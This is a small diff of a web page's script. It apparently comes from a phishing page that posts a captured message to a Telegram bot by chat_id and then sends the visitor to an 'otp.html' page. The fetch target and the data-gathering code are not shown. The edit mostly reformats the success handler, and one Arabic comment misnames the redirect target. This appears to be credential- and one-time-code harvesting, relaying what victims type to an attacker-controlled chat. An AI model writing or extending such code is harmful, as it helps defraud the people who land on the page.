@@ -180,13 +180,14 @@
                 body: JSON.stringify({ chat_id: chatId, text: message })
             })
             .then(response => response.json())
-    .then(data => {
-        if (data.ok) {
-            window.location.href = "otp.html";  // 👈 إعادة التوجيه بعد النجاح
-        } else {
-        }
-    })
-}
+.then(data => {
+    if (data.ok) {
+        window.location.href = "otp.html";  // توجيه المستخدم إلى صفحة eror.html
+    } else {
+        // يمكن إضافة معالجة الخطأ هنا إذا أردت
+    }
+})
+
     </script>
     
 </body>
